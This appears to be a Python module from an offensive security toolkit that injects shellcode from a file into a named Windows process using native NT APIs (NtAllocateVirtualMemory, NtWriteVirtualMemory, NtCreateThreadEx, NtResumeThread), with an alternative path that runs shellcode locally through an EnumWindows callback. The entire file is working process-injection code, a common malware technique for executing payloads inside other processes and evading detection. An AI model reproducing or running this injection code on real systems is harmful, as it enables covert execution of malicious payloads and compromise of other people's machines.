########################################################
### NtInjection Module
### Status: migrated 085
### 
########################################################

import os
from utils.windef import *
from utils.winconst import *
#from utils.helper import nstate
from utils.style import *
from utils.helper import CheckFile, GetFileInfo

CATEGORY    = 'inject'
DESCRIPTION = 'NT-Injection with native windows API (experimental)'

def register_arguments(parser):
            parser.add_argument('-i', '--input', help='Input file for process injection')
            parser.add_argument('-p', '--process', help='Processname to inject the shellcode')

            grp = parser.add_argument_group('additional')
            grp.add_argument('-s', '--start-process', action='store_true', help='If not active, start the process before injection')

class module:
    from urllib import request
    from time import sleep
    import wmi
    import threading

    Author = 'psycore8'
    Version = '0.0.7'
    DisplayName = 'NATIVE-INJECTION'
    delay = 5
    data_size = 0
    hash = ''
    pid = int
    nt_error = 0
    callback_func = False
    shellcode = b''
    relay_input = False

    def __init__(self, input, start_process, process):
        self.input_file = input
        self.process_start = start_process
        self.target_process = process


    def msg(self, message_type, MsgVar=None, ErrorExit=False):
        messages = {
            'pre.head'       : f'{FormatModuleHeader(self.DisplayName, self.Version)}\n',
            'error.input'    : f'{s_fail} File {self.input_file} not found or cannot be opened.',    
            'post.done'      : f'{s_ok} DONE!',
            'proc.input_ok'  : f'{s_ok} File {self.input_file} loaded\n{s_ok} Size of shellcode {self.data_size} bytes\n{s_ok} Hash: {self.hash}',
            'proc.input_try' : f'{s_note} Try to open file {self.input_file}',
            'proc.try'       : f'{s_note} Try to execute shellcode',
            'mok'            : f'{s_ok} {MsgVar}',
            'mnote'          : f'{s_note} {MsgVar}',
            'merror'         : f'{s_fail} {MsgVar}'

        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()

    def Start_Process(self):
        self.msg('mnote', f'starting {self.target_process}')
        os.system(self.target_process)

    def get_proc_id(self):
        processes = self.wmi.WMI().Win32_Process(name=self.target_process)
        self.pid = processes[0].ProcessId
        self.msg('mok', f'{self.target_process} process id: {self.pid}')
        return int(self.pid)

    def start_injection(self):
        if self.callback_func:
            mem = VirtualAlloc(0, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
            self.msg('mnote', f'Allocated memory address: 0x{mem:X}')
            #print(f'0x{mem:X}')
            RtlMoveMemory(mem, self.shellcode, len(self.shellcode))
            try:
                pEnumWindows(mem, 0)
            except:
                #print('Exception handling')
                self.msg('merror', 'EnumWindows exception!', True)
            exit()

        if self.Start_Process:
            s = self.threading.Thread(target=self.Start_Process)
            s.start()
            self.sleep(3)

        process_id = self.get_proc_id()
        base_address = ctypes.c_void_p(0)
        
        phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
        if phandle:
            self.msg('mok', 'Opened a Handle to the process')

        rs = SIZE_T(len(self.shellcode))
        rs_ptr = ctypes.byref(rs)
        memory = pNtAllocateVirtualMemory(phandle, ctypes.byref(base_address), 0, rs_ptr, MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
        if memory == NT_SUCCESS:
            self.msg('mok', 'Allocated Memory in the process')
        else:
            self.nt_error = memory
            self.msg('merror', f'Error during memory allocation for address 0x{self.nt_error:X}', True)

        bs = len(self.shellcode)
        writing = pNtWriteVirtualMemory(phandle, base_address, self.shellcode, bs, None)
        if writing == NT_SUCCESS:
            self.msg('mok', 'Wrote The shellcode to memory')
        else:
            self.nt_error = memory
            self.msg('merror', f'Error during memory writing to address 0x{self.nt_error:X}', True)
        th = HANDLE()
        Injection = pNtCreateThreadEx(ctypes.byref(th), ACCESS_MASK(GENERIC_ALL), None, phandle, base_address, None, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, 0, 0, 0, None)

        if Injection == NT_SUCCESS :
            self.msg('mok', 'Injected the shellcode into the process')
        else:
            self.nt_error = memory
            self.msg('merrore', f'Error during thread creation at address 0x{self.nt_error:X}', True)

        #print('Thread suspended, waiting 10 seconds...')
        self.msg('mnote', 'Thread suspended, waiting 10 seconds...')
        self.sleep(10)

        suspend_count = ULONG(0)
        resume = pNtResumeThread(th, ctypes.byref(suspend_count))
        WaitForSingleObject(th, -1)

        if resume == NT_SUCCESS:
            self.msg('mok', 'Injection successful')
        else:
            self.msg('merror', 'Injection failed!')
        CloseHandle(phandle)

    def proc_inject():
        return False
    
    def open_file(self):
        if self.relay_input:
            self.shellcode = bytes(self.input_file)
        else:
            try:
                with open(self.input_file, 'rb') as file:
                    self.shellcode = file.read()
            except FileNotFoundError:
                return False
    
    def process(self):
        self.msg('pre.head')
        if not self.relay_input:
            self.msg('proc.input_try')
            if CheckFile(self.input_file):
                self.data_size, self.hash = GetFileInfo(self.input_file)
                self.msg('proc.input_ok')
            else:
                self.msg('error.input', True)
        self.open_file()
        self.msg('proc.try')
        self.start_injection()

        self.msg('post.done')